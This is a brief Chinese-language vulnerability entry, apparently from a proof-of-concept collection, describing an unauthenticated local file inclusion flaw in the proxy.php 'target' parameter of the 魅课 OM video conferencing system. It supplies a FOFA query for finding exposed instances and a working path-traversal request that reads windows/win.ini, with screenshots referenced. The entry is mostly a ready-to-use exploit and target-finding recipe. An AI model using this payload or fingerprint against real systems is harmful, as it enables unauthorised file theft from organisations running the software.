# 魅课 OM视频会议系统 proxy.php 文件包含漏洞

## 漏洞描述

魅课OM视频会议系统 proxy.php文件target参数存在本地文件包含漏洞。攻击者可借助该漏洞无需登录便可下载任意文件。

## 漏洞影响

```
魅课OM视频会议系统
```

## FOFA

```
app="OMEETING-OM视频会议"
```

## 漏洞复现

登录页面

![image-20220525153028849](./images/202205251530024.png)

验证POC

```
/admin/do/proxy.php?method=get&target=../../../../../../../../../../windows/win.ini
```

![image-20220525153105283](./images/202205251531338.png)